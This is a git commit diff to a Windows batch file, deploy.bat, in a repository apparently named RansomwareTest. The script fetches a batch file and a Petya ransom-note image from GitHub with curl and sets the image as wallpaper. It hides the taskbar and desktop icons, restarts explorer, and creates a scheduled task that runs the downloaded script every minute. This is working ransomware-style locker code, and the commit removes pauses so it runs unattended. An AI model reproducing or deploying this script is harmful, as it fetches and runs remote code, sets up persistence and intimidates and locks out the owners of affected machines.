e72f5f656dfd4a720f82f9e83adba822fa54b426
git-TGMB <133995763+git-TGMB@users.noreply.github.com>
2024-03-12 12:16:33 -0500

    Update deploy.bat

--- deploy.bat
+++ deploy.bat
@@ -1,5 +1,7 @@
 set "TaskName=PopupTask"
 set "url=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
+set "wallpaperurl=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/petya-ransom-note.jpg"
+set "wallpaperpath=C:\temp\petya-ransom-note.jpg"
 set "ScriptPath=C:\temp\popup.bat"
 
 :: Block user input
@@ -7,23 +9,20 @@ set "ScriptPath=C:\temp\popup.bat"
 
 :: persistence
 curl -L -o "%ScriptPath%" "%url%"
-timeout 3
-pause
-
-:: schtask for popup.bat
-schtasks /Create /TN "%TaskName%" /TR "%ScriptPath%" /SC MINUTE /MO 1 /RL LIMITED /F
-schtasks /Run /TN %TaskName%
+curl -L -o %wallpaperpath% %wallpaperurl%
 
 :: Hide taskbar
 powershell -WindowStyle Hidden -Command "&{$p = (New-Object -ComObject Shell.Application).Windows() | Where-Object {$_.Name -eq 'Taskbar'}; $p.Visible = 0}"
-pause
 
 :: Change wallpaper
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\temp\petya-ransom-note.jpg" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaperpath% /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-pause
 
 :: Hide desktop icons
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
 taskkill /f /im explorer.exe
 start explorer.exe
+
+:: schtask for popup.bat
+schtasks /Create /TN "%TaskName%" /TR "%ScriptPath%" /SC MINUTE /MO 1 /RL LIMITED /F
+schtasks /Run /TN %TaskName%
